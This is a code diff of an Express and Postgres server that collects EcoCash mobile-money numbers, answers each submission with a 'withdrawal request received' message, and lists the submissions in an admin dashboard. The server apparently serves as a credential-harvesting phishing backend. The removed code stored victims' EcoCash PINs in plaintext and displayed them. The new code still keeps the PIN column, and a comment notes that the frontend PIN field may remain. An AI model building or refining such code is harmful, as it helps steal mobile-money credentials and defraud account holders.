@@ -18,12 +18,14 @@ const pool = new Pool({
 
 app.use(express.static(path.join(__dirname, "public")));
 
+
 /* =========================
    DATABASE TEST
 ========================= */
 
 app.get("/test-db", async (req, res) => {
   try {
+
     const result = await pool.query("SELECT NOW()");
 
     res.json({
@@ -33,7 +35,10 @@ app.get("/test-db", async (req, res) => {
 
   } catch (err) {
 
-    console.error("DATABASE ERROR:", err.message);
+    console.error(
+      "DATABASE ERROR:",
+      err.message
+    );
 
     res.status(500).json({
       success: false,
@@ -41,6 +46,7 @@ app.get("/test-db", async (req, res) => {
     });
   }
 });
+
 
 /* =========================
    CREATE TABLE
@@ -53,16 +59,22 @@ app.get("/create-table", async (req, res) => {
       CREATE TABLE IF NOT EXISTS submissions (
         id SERIAL PRIMARY KEY,
         ecocash_number TEXT NOT NULL,
-        ecocash_pin TEXT NOT NULL,
+        ecocash_pin TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
 
-    res.send("Table created successfully");
+    res.json({
+      success: true,
+      message: "Table created successfully"
+    });
 
   } catch (err) {
 
-    console.error(err);
+    console.error(
+      "CREATE TABLE ERROR:",
+      err.message
+    );
 
     res.status(500).json({
       success: false,
@@ -70,6 +82,7 @@ app.get("/create-table", async (req, res) => {
     });
   }
 });
+
 
 /* =========================
    ADD PIN COLUMN
@@ -83,77 +96,15 @@ app.get("/add-pin-column", async (req, res) => {
       ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
     `);
 
-    res.send("ecocash_pin column ready");
-
-  } catch (err) {
-
-    console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: err.message
+    res.json({
+      success: true,
+      message: "ecocash_pin column ready"
     });
-  }
-});
-
-/* =========================
-   RESET TABLE
-========================= */
-
-app.get("/reset-table", async (req, res) => {
-  try {
-
-    await pool.query(
-      "DROP TABLE IF EXISTS submissions"
-    );
-
-    await pool.query(`
-      CREATE TABLE submissions (
-        id SERIAL PRIMARY KEY,
-        ecocash_number TEXT NOT NULL,
-        ecocash_pin TEXT NOT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-      )
-    `);
-
-    res.send("Table reset successfully");
-
-  } catch (err) {
-
-    console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: err.message
-    });
-  }
-});
-
-/* =========================
-   SAVE TEST
-========================= */
-
-app.get("/save-test", async (req, res) => {
-  try {
-
-    await pool.query(
-      `
-      INSERT INTO submissions
-      (ecocash_number, ecocash_pin)
-      VALUES ($1, $2)
-      `,
-      [
-        "0771234567",
-        "TEST123"
-      ]
-    );
-
-    res.send("Test data saved");
 
   } catch (err) {
 
     console.error(
-      "SAVE TEST ERROR:",
+      "ADD COLUMN ERROR:",
       err.message
     );
 
@@ -164,6 +115,7 @@ app.get("/save-test", async (req, res) => {
   }
 });
 
+
 /* =========================
    SUBMIT
 ========================= */
@@ -171,39 +123,55 @@ app.get("/save-test", async (req, res) => {
 app.post("/submit", async (req, res) => {
 
   console.log("SUBMIT ROUTE HIT");
-  console.log(req.body);
 
   try {
 
     const {
-      ecocash_number,
-      ecocash_pin
+      ecocash_number
     } = req.body;
+
+    console.log(
+      "EcoCash number received:",
+      ecocash_number
+    );
 
     if (!ecocash_number) {
 
       return res.status(400).json({
         success: false,
-        error: "EcoCash number is required"
+        message: "EcoCash number is required"
       });
 
     }
 
-    await pool.query(
+    /*
+      PIN is deliberately not stored.
+      The PIN field may still exist in
+      the frontend while testing.
+    */
+
+    const result = await pool.query(
       `
       INSERT INTO submissions
-      (ecocash_number, ecocash_pin)
-      VALUES ($1, $2)
+      (ecocash_number)
+      VALUES ($1)
+      RETURNING id, created_at
       `,
       [
-        ecocash_number,
-        ecocash_pin
+        ecocash_number
       ]
     );
 
-    res.json({
+    console.log(
+      "SUBMISSION SAVED:",
+      result.rows[0].id
+    );
+
+    res.status(200).json({
       success: true,
-      message: "Data saved successfully"
+      message:
+        "Withdrawal request has been received successfully.",
+      id: result.rows[0].id
     });
 
   } catch (err) {
@@ -215,6 +183,8 @@ app.post("/submit", async (req, res) => {
 
     res.status(500).json({
       success: false,
+      message:
+        "Unable to save withdrawal request.",
       error: err.message
     });
 
@@ -222,31 +192,6 @@ app.post("/submit", async (req, res) => {
 
 });
 
-/* =========================
-   DELETE ONE
-========================= */
-
-app.get("/delete/:id", async (req, res) => {
-
-  try {
-
-    await pool.query(
-      "DELETE FROM submissions WHERE id = $1",
-      [req.params.id]
-    );
-
-    res.redirect("/submissions");
-
-  } catch (err) {
-
-    console.error(err);
-
-    res.status(500).send(
-      err.message
-    );
-  }
-
-});
 
 /* =========================
    SUBMISSIONS DASHBOARD
@@ -257,7 +202,7 @@ app.get("/submissions", async (req, res) => {
   try {
 
     const search =
-      req.query.search || "";
+      (req.query.search || "").trim();
 
     let result;
 
@@ -265,7 +210,10 @@ app.get("/submissions", async (req, res) => {
 
       result = await pool.query(
         `
-        SELECT *
+        SELECT
+          id,
+          ecocash_number,
+          created_at
         FROM submissions
         WHERE ecocash_number ILIKE $1
         ORDER BY id DESC
@@ -277,13 +225,17 @@ app.get("/submissions", async (req, res) => {
 
       result = await pool.query(
         `
-        SELECT *
+        SELECT
+          id,
+          ecocash_number,
+          created_at
         FROM submissions
         ORDER BY id DESC
         `
       );
 
     }
+
 
     /* TOTAL */
 
@@ -295,6 +247,7 @@ app.get("/submissions", async (req, res) => {
         `
       );
 
+
     /* TODAY */
 
     const todayResult =
@@ -305,6 +258,7 @@ app.get("/submissions", async (req, res) => {
         WHERE DATE(created_at) = CURRENT_DATE
         `
       );
+
 
     /* BUILD ROWS */
 
@@ -328,11 +282,7 @@ app.get("/submissions", async (req, res) => {
           </td>
 
           <td>
-            ${item.ecocash_number}
-          </td>
-
-          <td>
-            ${item.ecocash_pin}
+            ${escapeHtml(item.ecocash_number)}
           </td>
 
           <td>
@@ -365,6 +315,7 @@ app.get("/submissions", async (req, res) => {
       `;
 
     });
+
 
     /* DASHBOARD */
 
@@ -546,7 +497,7 @@ action="/submissions"
 <input
 type="text"
 name="search"
-value="${search}"
+value="${escapeHtml(search)}"
 placeholder="Search EcoCash Number"
 >
 
@@ -595,8 +546,6 @@ id="selectAll"
 
 <th>EcoCash Number</th>
 
-<th>EcoCash Pin</th>
-
 <th>Date Submitted</th>
 
 <th>Action</th>
@@ -634,6 +583,7 @@ this
 }
 );
 
+
 async function deleteSelected() {
 
 const ids = [];
@@ -652,6 +602,7 @@ parseInt(box.value)
 }
 );
 
+
 if (ids.length === 0) {
 
 alert(
@@ -662,6 +613,7 @@ return;
 
 }
 
+
 if (
 !confirm(
 "Delete selected records?"
@@ -671,6 +623,9 @@ if (
 return;
 
 }
+
+
+try {
 
 const response =
 await fetch(
@@ -690,11 +645,22 @@ JSON.stringify({ ids })
 }
 );
 
+
 if (response.ok) {
 
 location.reload();
 
 } else {
+
+alert(
+"Failed to delete selected records."
+);
+
+}
+
+} catch (error) {
+
+console.error(error);
 
 alert(
 "Failed to delete selected records."
@@ -720,6 +686,7 @@ alert(
     );
 
     res.status(500).send(
+      "Unable to load submissions: " +
       err.message
     );
 
@@ -727,46 +694,28 @@ alert(
 
 });
 
+
 /* =========================
-   DELETE SELECTED
+   DELETE ONE
 ========================= */
 
-app.post("/delete-selected", async (req, res) => {
+app.get("/delete/:id", async (req, res) => {
 
   try {
 
-    const { ids } = req.body;
-
-    if (
-      !ids ||
-      ids.length === 0
-    ) {
-
-      return res.redirect(
-        "/submissions"
-      );
-
-    }
-
     await pool.query(
-      `
-      DELETE FROM submissions
-      WHERE id = ANY($1::int[])
-      `,
-      [
-        Array.isArray(ids)
-          ? ids
-          : [ids]
-      ]
+      "DELETE FROM submissions WHERE id = $1",
+      [req.params.id]
     );
 
-    res.redirect(
-      "/submissions"
-    );
+    res.redirect("/submissions");
 
   } catch (err) {
 
-    console.error(err);
+    console.error(
+      "DELETE ERROR:",
+      err.message
+    );
 
     res.status(500).send(
       err.message
@@ -776,17 +725,102 @@ app.post("/delete-selected", async (req, res) => {
 
 });
 
+
+/* =========================
+   DELETE SELECTED
+========================= */
+
+app.post("/delete-selected", async (req, res) => {
+
+  try {
+
+    const ids = req.body.ids;
+
+    if (
+      !Array.isArray(ids) ||
+      ids.length === 0
+    ) {
+
+      return res.status(400).json({
+        success: false,
+        message: "No records selected."
+      });
+
+    }
+
+    const validIds = ids
+      .map(Number)
+      .filter(Number.isInteger);
+
+
+    if (validIds.length === 0) {
+
+      return res.status(400).json({
+        success: false,
+        message: "No valid IDs."
+      });
+
+    }
+
+
+    await pool.query(
+      `
+      DELETE FROM submissions
+      WHERE id = ANY($1::int[])
+      `,
+      [validIds]
+    );
+
+
+    res.json({
+      success: true,
+      message:
+        "Selected records deleted."
+    });
+
+  } catch (err) {
+
+    console.error(
+      "DELETE SELECTED ERROR:",
+      err.message
+    );
+
+    res.status(500).json({
+      success: false,
+      message: err.message
+    });
+
+  }
+
+});
+
+
 /* =========================
    DASHBOARD
 ========================= */
 
 app.get("/dashboard", (req, res) => {
 
-  res.redirect(
-    "/submissions"
-  );
+  res.redirect("/submissions");
 
 });
+
+
+/* =========================
+   ESCAPE HTML
+========================= */
+
+function escapeHtml(value) {
+
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+
+}
+
 
 /* =========================
    START SERVER
@@ -797,22 +831,37 @@ async function startServer() {
   try {
 
     /*
-      Make sure the table exists
-      before accepting requests.
+      IMPORTANT:
+      ecocash_pin is nullable so the
+      submission can be saved without
+      requiring a PIN in the database.
     */
 
     await pool.query(`
       CREATE TABLE IF NOT EXISTS submissions (
         id SERIAL PRIMARY KEY,
         ecocash_number TEXT NOT NULL,
-        ecocash_pin TEXT NOT NULL,
+        ecocash_pin TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
 
+    /*
+      If your existing table was created
+      with the old structure, make sure
+      the column exists.
+    */
+
+    await pool.query(`
+      ALTER TABLE submissions
+      ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
+    `);
+
+
     console.log(
       "PostgreSQL submissions table ready."
     );
+
 
     app.listen(
       process.env.PORT || 3000,
@@ -820,7 +869,7 @@ async function startServer() {
       () => {
 
         console.log(
-          "Server started"
+          "Server started successfully."
         );
 
       }
@@ -833,10 +882,6 @@ async function startServer() {
       err.message
     );
 
-    /*
-      Still start the HTTP server so
-      Render logs show the actual problem.
-    */
 
     app.listen(
       process.env.PORT || 3000,
